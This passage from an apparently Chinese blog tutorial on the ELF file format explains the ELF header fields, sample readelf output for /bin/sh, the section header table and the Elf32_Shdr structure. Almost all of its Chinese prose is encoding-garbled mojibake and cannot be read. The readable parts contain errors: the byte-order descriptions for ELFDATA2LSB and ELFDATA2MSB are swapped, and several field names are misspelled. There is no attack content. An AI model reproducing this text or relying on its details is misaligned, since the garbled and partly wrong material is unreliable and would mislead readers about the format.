class="comment">//ç¨‹åºå¤´çš„ä¸ªæ•°Program header</span></span><br><span class="line">Elf32_Half e_shentsize;           <span class="comment">//èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼çš„è¡¨é¡¹å¤§å°</span></span><br><span class="line">Elf32_Half e_shnum;               <span class="comment">//æ®µå¤´çš„ä¸ªæ•°Section header</span></span><br><span class="line">Elf32_Half e_shstrndx;            <span class="comment">//Stringæ®µåœ¨æ•´ä¸ªæ®µåˆ—è¡¨ä¸­çš„ç´¢å¼•å€¼</span></span><br><span class="line">&#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h4 id="è¯¦ç»†è§£é‡Š"><a href="#è¯¦ç»†è§£é‡Š" class="headerlink" title="è¯¦ç»†è§£é‡Š"></a>è¯¦ç»†è§£é‡Š</h4><h5 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h5><p>æ•°ç»„ç»™å‡ºäº†ELFçš„ä¸€äº›æ ‡è¯†ä¿¡æ¯ï¼Œè¿™ä¸ªæ•°ç»„ä¸­ä¸åŒä¸‹æ ‡çš„å«ä¹‰å¦‚è¡¨æ‰€ç¤ºï¼š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/3.png" alt="png"></p><p>è¿™äº›ç´¢å¼•è®¿é—®åŒ…å«ä»¥ä¸‹æ•°å€¼çš„å­—èŠ‚ï¼š</p><ul><li><p>EI_MAG0 åˆ° EI_MAG3ï¼š<strong>é­”æ•°ï¼ˆMagic Numberï¼‰</strong>ï¼Œæ ‡å¿—æ­¤æ–‡ä»¶æ˜¯ä¸€ä¸ªELFç›®æ ‡æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åç§°            å–å€¼         ä½ç½®</span><br><span class="line">EI_MAG0        0x7f       e_ident[EI_MAG0]</span><br><span class="line">EI_MAG1        &#39;E&#39;        e_ident[EI_MAG1]</span><br><span class="line">EI_MAG2        &#39;L&#39;        e_ident[EI_MAG2]</span><br><span class="line">EI_MAG3        &#39;F&#39;        e_ident[EI_MAG3]</span><br></pre></td></tr></table></figure></li><li><p>EI_CLASSï¼šæ ‡è¯†æ–‡ä»¶çš„ç±»åˆ«ï¼Œæˆ–è€…è¯´ï¼Œå®¹é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åç§°             å–å€¼            ä½ç½®</span><br><span class="line">ELFCLASSNONE     0            éæ³•ç±»åˆ«</span><br><span class="line">ELFCLASS32       1            32ä½ç›®æ ‡</span><br><span class="line">ELFCLASS64       2            64ä½ç›®æ ‡</span><br><span class="line">ps:ELFCLASS32æ”¯æŒè™šå­˜èŒƒå›´4GBï¼ŒELFCLASS64æ˜¯ä¸º64ä½é¢„ç•™çš„ï¼Œä¸è¿‡æ–‡ä»¶ä¸­çš„å…¶ä»–å†…å®¹éƒ½æ²¡æœ‰é’ˆå¯¹64ä½å®šä¹‰</span><br></pre></td></tr></table></figure></li><li><p>EI_DATAï¼šå­—èŠ‚e_ident[EI_DATA] ç»™å‡ºå¤„ç†å™¨ç‰¹å®šæ•°æ®çš„æ•°æ®ç¼–ç æ–¹å¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åç§°            å–å€¼              ä½ç½®</span><br><span class="line">ELFDATANONE     0             éæ³•æ•°æ®ç¼–ç </span><br><span class="line">ELFDATA2LSB     1             é«˜ä½åœ¨å‰</span><br><span class="line">ELFDATA2MSB     2             ä½ä½åœ¨å‰</span><br></pre></td></tr></table></figure></li><li><p>EI_VERSIONï¼šELFå¤´éƒ¨çš„ç‰ˆæœ¬å·ç ï¼Œç›®å‰æ­¤å€¼å¿…é¡»æ˜¯EV_CURRENTã€‚</p></li><li><p>EI_PADï¼šæ ‡è®°e_identä¸­æœªä½¿ç”¨å­—èŠ‚çš„å¼€å§‹ï¼Œåˆå§‹åŒ–ä¸º0ã€‚</p></li></ul><hr><h5 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h5><p>ç›®æ ‡æ–‡ä»¶ç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">åç§°            å–å€¼          å«ä¹‰</span><br><span class="line">ET_NONE         0         æœªçŸ¥ç›®æ ‡æ–‡ä»¶æ ¼å¼</span><br><span class="line">ET_REL          1         å¯é‡å®šä½æ–‡ä»¶</span><br><span class="line">ET_EXEC         2         å¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">ET_DYN          3         å…±äº«ç›®æ ‡æ–‡ä»¶</span><br><span class="line">ET_CORE         4         Coreæ–‡ä»¶ï¼ˆè½¬å‚¨æ ¼å¼ï¼‰</span><br><span class="line">ET_LOPROC     0xff00      ç‰¹å®šå¤„ç†å™¨æ–‡ä»¶</span><br><span class="line">ET_HIPROC     0xffff      ç‰¹å®šå¤„ç†å™¨æ–‡ä»¶</span><br><span class="line">ps:ET_LOPROCå’ŒET_HIPROCä¹‹é—´çš„å–å€¼ç”¨æ¥æ ‡è¯†ä¸å¤„ç†å™¨ç›¸å…³çš„æ–‡ä»¶æ ¼å¼</span><br></pre></td></tr></table></figure><hr><h5 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h5><p>ç»™å‡ºæ–‡ä»¶çš„ç›®æ ‡ä½“ç³»ç»“æ„ç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">åç§°            å–å€¼          å«ä¹‰</span><br><span class="line">EM_NONE         0           æœªæŒ‡å®š</span><br><span class="line">EM_M32          1           AT&amp;T WE 32100</span><br><span class="line">EM_SPARC        2           SPARC</span><br><span class="line">EM_386          3           Intel 80386</span><br><span class="line">EM_68K          4           Motorola 68000</span><br><span class="line">EM_88K          5           Motorola 88000</span><br><span class="line">EM_860          7           Intel 80860</span><br><span class="line">EM_MIPS         8           MIPS RS3000</span><br><span class="line">ps:å…¶ä»–å€¼éƒ½æ˜¯ä¿ç•™çš„ã€‚ç‰¹å®šå¤„ç†å™¨çš„ELFåç§°ä¼šä½¿ç”¨æœºå™¨åæ¥è¿›è¡ŒåŒºåˆ†ã€‚</span><br></pre></td></tr></table></figure><hr><h5 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h5><p>ç›®æ ‡æ–‡ä»¶ç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åç§°            å–å€¼          å«ä¹‰</span><br><span class="line">  EV_NONE         0           éæ³•ç‰ˆæœ¬</span><br><span class="line">  EV_CURRENT      1           å½“å‰ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><hr><h5 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h5><p>ç¨‹åºå…¥å£çš„è™šæ‹Ÿåœ°å€ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶æ²¡æœ‰ç¨‹åºå…¥å£ï¼Œå¯ä»¥ä¸º0</p><hr><h5 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h5><p>ç¨‹åºå¤´éƒ¨è¡¨æ ¼ï¼ˆProgram Header Tableï¼‰çš„åç§»é‡ï¼ˆæŒ‰å­—èŠ‚è®¡ç®—ï¼‰ã€‚å¦‚æœæ–‡ä»¶æ²¡æœ‰ç¨‹åºå¤´éƒ¨è¡¨æ ¼ï¼Œå¯ä»¥ä¸º0</p><hr><h5 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h5><p>èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼ï¼ˆSection Header Tableï¼‰çš„åç§»é‡ï¼ˆæŒ‰å­—èŠ‚è®¡ç®—ï¼‰ã€‚å¦‚æœæ–‡ä»¶æ²¡æœ‰èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼ï¼Œå¯ä»¥ä¸º0</p><hr><h5 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h5><p>ä¿å­˜ä¸æ–‡ä»¶ç›¸å…³çš„ï¼Œç‰¹å®šäºå¤„ç†å™¨çš„æ ‡å¿—ã€‚æ ‡å¿—åç§°é‡‡ç”¨EF_machine_flagçš„æ ¼å¼</p><hr><h5 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h5><p>ELFå¤´éƒ¨çš„å¤§å°ï¼ˆä»¥å­—èŠ‚è®¡ç®—ï¼‰</p><hr><h5 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h5><p>ç¨‹åºå¤´éƒ¨è¡¨æ ¼çš„è¡¨é¡¹å¤§å°ï¼ˆæŒ‰å­—èŠ‚è®¡ç®—ï¼‰</p><hr><h5 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h5><p>ç¨‹åºå¤´éƒ¨è¡¨æ ¼çš„è¡¨é¡¹æ•°ç›®ã€‚å¯ä»¥ä¸º0</p><hr><h5 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h5><p>èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼çš„è¡¨é¡¹å¤§å°ï¼ˆæŒ‰å­—èŠ‚è®¡ç®—ï¼‰</p><hr><h5 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h5><p>èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼çš„è¡¨é¡¹æ•°ç›®ã€‚å¯ä»¥ä¸º0</p><hr><h5 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h5><p>èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼ä¸­ä¸èŠ‚åŒºåç§°å­—ç¬¦ä¸²è¡¨ç›¸å…³çš„è¡¨é¡¹çš„ç´¢å¼•ã€‚å¦‚æœæ–‡ä»¶æ²¡æœ‰èŠ‚åŒºåç§°å­—ç¬¦ä¸²è¡¨ï¼Œæ­¤å‚æ•°å¯ä»¥ä¸ºSHN_UNDEF</p><h4 id="å®ä¾‹æ¼”ç¤º"><a href="#å®ä¾‹æ¼”ç¤º" class="headerlink" title="å®ä¾‹æ¼”ç¤º"></a>å®ä¾‹æ¼”ç¤º</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux ubuntu 5.4.0-55-generic #61-Ubuntu SMP Mon Nov 9 20:49:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">ascotbe@ubuntu:~$ readelf -h /bin/sh</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              DYN (Shared object file)</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x5cd0</span></span><br><span class="line"><span class="string">  Start of program headers:          64 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          127896 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           56 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         13</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         30</span></span><br><span class="line"><span class="string">  Section header string table index: 29</span></span><br></pre></td></tr></table></figure><p>ELFæ–‡ä»¶ç»“æ„ç¤ºæ„å›¾ä¸­å®šä¹‰çš„<code>ELF_Endr</code>çš„å„ä¸ªæˆå‘˜çš„å«ä¹‰ä¸readelfå…·æœ‰å¯¹åº”å…³ç³»ï¼š</p><table><thead><tr><th>æˆå‘˜</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>e_ident</td><td>Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</td></tr><tr><td></td><td>class: ELF64</td></tr><tr><td></td><td>Data: 2â€™s complement, little endian</td></tr><tr><td></td><td>Version: 1 (current)</td></tr><tr><td></td><td>OS/ABI: UNIX - System V</td></tr><tr><td></td><td>ABI Version: 0</td></tr><tr><td>e_type</td><td>Type: DYN (Shared object file)</td></tr><tr><td></td><td>å…±äº«ç›®æ ‡æ–‡ä»¶</td></tr><tr><td>e_machine</td><td>Advanced Micro Devices X86-64</td></tr><tr><td></td><td>ELFæ–‡ä»¶çš„CPIå¹³å°å±æ€§</td></tr><tr><td>e_version</td><td>Version: 0x1</td></tr><tr><td></td><td>ELFç‰ˆæœ¬å·ã€‚ä¸€èˆ¬ä¸ºå¸¸æ•°1</td></tr><tr><td>e_entry</td><td>Entry point address: 0x5cd0</td></tr><tr><td></td><td>å…¥å£åœ°å€ï¼Œè§„å®šELFç¨‹åºçš„å…¥å£è™šæ‹Ÿåœ°å€ï¼Œæ“ä½œç³»ç»Ÿåœ¨åŠ è½½å®Œè¯¥ç¨‹åºåä»è¿™ä¸ªåœ°å€å¼€å§‹æ‰§è¡Œè¿›ç¨‹çš„æŒ‡ä»¤ã€‚</td></tr><tr><td>e_phoff</td><td>Start of program headers: 64 (bytes into file)</td></tr><tr><td>e_shoff</td><td>Start of section headers: 127896 (bytes into file)</td></tr><tr><td></td><td>Section Header Table åœ¨æ–‡ä»¶ä¸­çš„åç§»</td></tr><tr><td>e_word</td><td>Flags: 0x0</td></tr><tr><td></td><td>ELFæ ‡å¿—ä½ï¼Œç”¨æ¥æ ‡è¯†ä¸€äº›ELFæ–‡ä»¶å¹³å°ç›¸å…³çš„å±æ€§</td></tr><tr><td>e_ehsize</td><td>Size of this header: 64(bytes)</td></tr><tr><td></td><td>ELF Headeræœ¬èº«çš„å¤§å°</td></tr><tr><td>e_phentsize</td><td>Size of program headers:56 (bytes)</td></tr><tr><td>e_phnum</td><td>Number of program headers: 13</td></tr><tr><td>e_shentsize</td><td>Size of section headers: 64 (bytes)</td></tr><tr><td></td><td>å•ä¸ªSection Headerå¤§å°</td></tr><tr><td>e_shnum</td><td>Number of section headers: 30</td></tr><tr><td></td><td>Section Headerçš„æ•°é‡</td></tr><tr><td>e_shstrndx</td><td>Section header string table index: 29</td></tr><tr><td></td><td>Section Headerå­—ç¬¦ä¸²åœ¨Section Header Tableä¸­çš„ç´¢å¼•</td></tr></tbody></table><h3 id="ELF-Section-Header-Table"><a href="#ELF-Section-Header-Table" class="headerlink" title="ELF Section Header Table"></a>ELF Section Header Table</h3><p>ELFèŠ‚å¤´è¡¨æ˜¯ä¸€ä¸ªèŠ‚å¤´æ•°ç»„ã€‚æ¯ä¸€ä¸ªèŠ‚å¤´éƒ½æè¿°äº†å…¶æ‰€å¯¹åº”çš„èŠ‚çš„ä¿¡æ¯ï¼Œå¦‚èŠ‚åã€èŠ‚å¤§å°ã€åœ¨æ–‡ä»¶ä¸­çš„åç§»ã€è¯»å†™æƒé™ç­‰ã€‚<strong>ç¼–è¯‘å™¨ã€é“¾æ¥å™¨ã€è£…è½½å™¨éƒ½æ˜¯é€šè¿‡èŠ‚å¤´è¡¨æ¥å®šä½å’Œè®¿é—®å„ä¸ªèŠ‚çš„å±æ€§çš„ã€‚</strong></p><p><code>e_shoff</code>æˆå‘˜ç»™å‡ºä»æ–‡ä»¶å¤´åˆ°èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼çš„åç§»å­—èŠ‚æ•°ï¼›<code>e_shnum</code>ç»™å‡ºè¡¨æ ¼ä¸­æ¡ç›®æ•°ç›®ï¼›<code>e_shentsize</code>ç»™å‡ºæ¯ä¸ªé¡¹ç›®çš„å­—èŠ‚æ•°ã€‚ä»è¿™äº›ä¿¡æ¯ä¸­å¯ä»¥ç¡®åˆ‡åœ°å®šä½èŠ‚åŒºçš„å…·ä½“ä½ç½®ã€é•¿åº¦ã€‚</p><p>èŠ‚åŒºå¤´éƒ¨è¡¨æ ¼ä¸­æ¯”è¾ƒç‰¹æ®Šçš„å‡ ä¸ªå°æ ‡å¦‚ä¸‹ï¼š</p><table><thead><tr><th>åç§°</th><th>å–å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SHN_UNDEF</td><td>0</td><td>æ ‡è®°æœªå®šä¹‰çš„ã€ç¼ºå¤±çš„ã€ä¸ç›¸å…³çš„ï¼Œæˆ–è€…æ²¡æœ‰å«ä¹‰çš„èŠ‚åŒºå¼•ç”¨</td></tr><tr><td>SHN_LORESERVE</td><td>0xFF00</td><td>ä¿ç•™ç´¢å¼•çš„ä¸‹ç•Œ</td></tr><tr><td>SHN_LOPROC</td><td>0xFF00</td><td>ä¿ç•™ç»™å¤„ç†å™¨ç‰¹æ®Šçš„è¯­ä¹‰</td></tr><tr><td>SHN_HIPROC</td><td>0xFF1F</td><td>ä¿ç•™ç»™å¤„ç†å™¨ç‰¹æ®Šçš„è¯­ä¹‰</td></tr><tr><td>SHN_ABS</td><td>0xFFF1</td><td>åŒ…å«å¯¹åº”å¼•ç”¨é‡çš„ç»å¯¹å–å€¼ã€‚è¿™äº›å€¼ä¸ä¼šè¢«é‡å®šä½æ‰€å½±å“</td></tr><tr><td>SHN_COMMON</td><td>0xFFF2</td><td>ç›¸å¯¹äºæ­¤èŠ‚åŒºå®šä¹‰çš„ç¬¦å·æ˜¯å…¬å…±ç¬¦å·ã€‚å¦‚FORTRANä¸­COMMONæˆ–è€…æœªåˆ†é…çš„Cå¤–éƒ¨å˜é‡</td></tr><tr><td>SHN_HIRESERVE</td><td>0xFFFF</td><td>ä¿ç•™ç´¢å¼•çš„ä¸Šç•Œ</td></tr></tbody></table><p>ä»‹äº<code>SHN_LORESERVE</code>å’Œ<code>SHN_HIRESERVE</code>ä¹‹é—´çš„è¡¨é¡¹ä¸ä¼šå‡ºç°åœ¨èŠ‚åŒºå¤´éƒ¨è¡¨ä¸­ã€‚</p><p>æ¯ä¸ªèŠ‚åŒºå¤´éƒ¨å¯ç”¨å¦‚ä¸‹æ•°æ®ç»“æ„æè¿°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word sh_name;      <span class="comment">//ç»™å‡ºèŠ‚åŒºåç§°ã€‚æ˜¯èŠ‚åŒºå¤´éƒ¨å­—ç¬¦ä¸²èŠ‚åŒºï¼ˆSection Header String Table Sectionï¼‰çš„ç´¢å¼•ã€‚åå­—æ˜¯ä¸€ä¸ªNULLç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œä¿å­˜åœ¨ä¸€ä¸ªåä¸º.shstrtabçš„å­—ç¬¦ä¸²è¡¨ï¼ˆå¯é€šè¿‡Section Headerç´¢å¼•åˆ°ï¼‰</span></span><br><span class="line">    Elf32_Word sh_type;      <span class="comment">//èŠ‚ç±»å‹ã€‚ä¸ºèŠ‚åŒºçš„å†…å®¹å’Œè¯­ä¹‰è¿›è¡Œåˆ†ç±»ã€‚</span></span><br><span class="line">    Elf32_Word sh_flags;     <span class="comment">//èŠ‚æ ‡å¿—ä½ã€‚èŠ‚åŒºæ”¯æŒ1ä½å½¢å¼çš„æ ‡å¿—ï¼Œè¿™äº›æ ‡å¿—æè¿°äº†å¤šç§å±æ€§</span></span><br><span class="line">    Elf32_Addr sh_addr;      <span class="comment">//èŠ‚çš„è™šæ‹Ÿåœ°å€ã€‚å¦‚æœèŠ‚åŒºå°†å‡ºç°åœ¨è¿›ç¨‹çš„å†…å­˜æ˜ åƒä¸­æˆ–å¯è¢«åŠ è½½ï¼Œåˆ™sh_addrä¸ºè¯¥èŠ‚è¢«åŠ è½½ååœ¨è¿›ç¨‹åœ°å€ç©ºé—´ä¸­çš„è™šæ‹Ÿåœ°å€ï¼Œç»™å‡ºèŠ‚åŒºçš„æ¯ä¸€ä¸ªå­—èŠ‚åº”å¤„çš„ä½ç½®ã€‚å¦åˆ™ï¼Œæ­¤å­—æ®µä¸º0</span></span><br><span class="line">    Elf32_Off sh_offset;     <span class="comment">//èŠ‚åç§»ã€‚å¦‚æœè¯¥èŠ‚å­˜åœ¨äºæ–‡ä»¶ä¸­ï¼Œåˆ™è¯¥èŠ‚è¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­çš„åç§»ï¼›å¦åˆ™æ— æ„ä¹‰ï¼Œå¦‚sh_offsetå¯¹äºBSSèŠ‚æ¥è¯´å°±æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚å³æ­¤æˆå‘˜çš„å–å€¼ç»™å‡ºèŠ‚åŒºçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸æ–‡ä»¶å¤´ä¹‹é—´çš„åç§»ã€‚</span></span><br><span class="line">    Elf32_Word sh_size;      <span class="comment">//èŠ‚å¤§å°ã€‚æ­¤æˆå‘˜ç»™å‡ºèŠ‚åŒºçš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚é™¤éèŠ‚åŒºçš„ç±»å‹æ˜¯SHT_NOBITSï¼Œå¦åˆ™èŠ‚åŒºå ç”¨æ–‡ä»¶ä¸­çš„sh_sizeå­—èŠ‚ã€‚</span></span><br><span class="line">    Elf32_Word sh_link;      <span class="comment">//èŠ‚é“¾æ¥ä¿¡æ¯ã€‚æ­¤æˆå‘˜ç»™å‡ºèŠ‚åŒºå¤´éƒ¨è¡¨ç´¢å¼•é“¾æ¥ï¼Œå…¶è§£é‡Šä¾èµ–äºèŠ‚åŒºç±»å‹</span></span><br><span class="line">    Elf32_Word sh_info;      <span class="comment">//èŠ‚é“¾æ¥ä¿¡æ¯ã€‚æ­¤æˆå‘˜ç»™å‡ºé™„åŠ ä¿¡æ¯ï¼Œå…¶è§£é‡Šä¾èµ–äºèŠ‚åŒºç±»å‹</span></span><br><span class="line">    Elf32_Word sh_addralign; <span class="comment">//èŠ‚åœ°å€å¯¹é½æ–¹å¼ã€‚æŸäº›èŠ‚åŒºå¸¦æœ‰åœ°å€å¯¹é½çº¦æŸã€‚</span></span><br><span class="line">    Elf32_Word sh_entsize;   <span class="comment">//èŠ‚é¡¹å¤§å°ã€‚æŸäº›èŠ‚åŒºä¸­åŒ…å«å›ºå®šå¤§å°çš„é¡¹ç›®ï¼Œå¦‚ç¬¦å·è¡¨ï¼Œå…¶åŒ…å«çš„æ¯ä¸ªç¬¦å·æ‰€åœ¨çš„å¤§å°éƒ½ä¸€æ ·ã€‚</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šç´¢å¼•ä¸ºé›¶ï¼ˆSHN_UNDFFï¼‰çš„èŠ‚åŒºå¤´éƒ¨ä¹Ÿæ˜¯å­˜åœ¨çš„ï¼Œå°½ç®¡æ­¤ç´¢å¼•æ ‡è®°çš„æ˜¯æœªå®šä¹‰çš„èŠ‚åŒºå¼•ç”¨ï¼Œå¹¶ä¸”èŠ‚åŒºçš„å†…å®¹å›ºå®š</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/4.png" alt="png"></p><h4 id="éƒ¨åˆ†å­—æ®µè§£æ"><a href="#éƒ¨åˆ†å­—æ®µè§£æ" class="headerlink" title="éƒ¨åˆ†å­—æ®µè§£æ"></a>éƒ¨åˆ†å­—æ®µè§£æ</h4><h5 id="sh-type"><a href="#sh-type" class="headerlink" title="sh_type"></a>sh_type</h5><p>èŠ‚åæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåªæ˜¯åœ¨é“¾æ¥å’Œç¼–è¯‘è¿‡ç¨‹ä¸­æœ‰æ„ä¹‰ï¼Œä½†å®ƒä¸èƒ½çœŸæ­£åœ°è¡¨ç¤ºèŠ‚çš„ç±»å‹ã€‚å¯¹äºç¼–è¯‘å™¨å’Œé“¾æ¥å™¨æ¥è¯´ï¼Œä¸»è¦å†³å®šèŠ‚çš„å±æ€§æ˜¯èŠ‚çš„ç±»å‹ï¼ˆ<code>sh_type</code>ï¼‰å’ŒèŠ‚çš„æ ‡å¿—ä½ï¼ˆ<code>sh_flags</code>ï¼‰</p><p>èŠ‚çš„ç±»å‹ç›¸å…³å¸¸é‡ä»¥<code>SHT_</code>å¼€å¤´ï¼Œä¸Šè¿°<code>readelf -S</code>å‘½ä»¤æ‰§è¡Œçš„ç»“æœçœç•¥äº†è¯¥å‰ç¼€ã€‚èŠ‚åŒºç±»å‹å®šä¹‰å¦‚è¡¨ï¼š</p><table><thead><tr><th>åç§°</th><th>å–å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SHT_NULL</td><td>0</td><td>æ­¤å€¼æ ‡å¿—èŠ‚åŒºå¤´éƒ¨æ˜¯éæ´»åŠ¨çš„ï¼Œæ²¡æœ‰å¯¹åº”çš„èŠ‚åŒºã€‚ï¼ˆæ— æ•ˆèŠ‚ï¼‰</td></tr><tr><td>SHT_PROGBITS</td><td>1</td><td><strong>ç¨‹åºèŠ‚</strong>ã€‚æ­¤èŠ‚åŒºåŒ…å«ç¨‹åºå®šä¹‰çš„ä¿¡æ¯ï¼Œå…¶æ ¼å¼å’Œå«ä¹‰éƒ½æœ‰ç¨‹åºæ¥è§£é‡Šï¼Œä»£ç èŠ‚ã€æ•°æ®èŠ‚éƒ½æ˜¯è¿™ç§ç±»å‹</td></tr><tr><td>SHT_SYMTAB</td><td>2</td><td>æ­¤èŠ‚åŒºåŒ…å«ä¸€ä¸ª<strong>ç¬¦å·è¡¨</strong>ã€‚ç›®å‰ç›®æ ‡æ–‡ä»¶å¯¹æ¯ç§ç±»å‹çš„èŠ‚åŒºéƒ½åªèƒ½åŒ…å«ä¸€ä¸ªï¼Œä¸è¿‡è¿™ä¸ªé™åˆ¶å°†æ¥å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚ä¸€èˆ¬ï¼ŒSHT_SYMTABèŠ‚åŒºæä¾›ç”¨äºé“¾æ¥ç¼–è¾‘ï¼ˆæŒ‡ldè€Œè¨€ï¼‰çš„ç¬¦å·ï¼Œå°½ç®¡ä¹Ÿå¯ç”¨æ¥å®ç°åŠ¨æ€é“¾æ¥</td></tr><tr><td>SHT_STRTAB</td><td>3</td><td>æ­¤èŠ‚åŒºåŒ…å«<strong>å­—ç¬¦ä¸²è¡¨</strong>ã€‚ç›®æ ‡æ–‡ä»¶å¯èƒ½åŒ…å«å¤šä¸ªå­—ç¬¦ä¸²è¡¨èŠ‚åŒº</td></tr><tr><td>SHT_RELA</td><td>4</td><td>æ­¤èŠ‚åŒºåŒ…å«<strong>é‡å®šä½è¡¨é¡¹</strong>ï¼Œå…¶ä¸­å¯èƒ½ä¼šæœ‰è¡¥é½å†…å®¹ï¼ˆaddendï¼‰ï¼Œä¾‹å¦‚32ä½ç›®æ ‡æ–‡ä»¶ä¸­çš„Elf32_Relaç±»å‹ã€‚ç›®æ ‡æ–‡ä»¶å¯èƒ½æ‹¥æœ‰å¤šä¸ªé‡å®šä½èŠ‚åŒº</td></tr><tr><td>SHT_HASH</td><td>5</td><td>æ­¤èŠ‚åŒºåŒ…å«<strong>ç¬¦å·å“ˆå¸Œè¡¨</strong>ã€‚æ‰€æœ‰å‚ä¸åŠ¨æ€é“¾æ¥çš„ç›®æ ‡éƒ½å¿…é¡»åŒ…å«ä¸€ä¸ªç¬¦å·å“ˆå¸Œè¡¨ã€‚ç›®å‰ï¼Œä¸€ä¸ªç›®æ 